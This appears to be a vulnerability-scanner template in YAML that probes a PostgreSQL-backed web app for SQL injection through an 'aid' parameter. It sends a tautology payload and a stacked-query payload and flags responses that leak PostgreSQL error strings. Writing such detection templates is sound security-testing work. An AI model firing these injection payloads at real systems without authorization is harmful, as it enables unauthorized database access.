id: sqli3-pg-04
name: 'SQLi pg prefix #3 in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - '1'' OR ''1''=''1'' /*'
        - '1''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
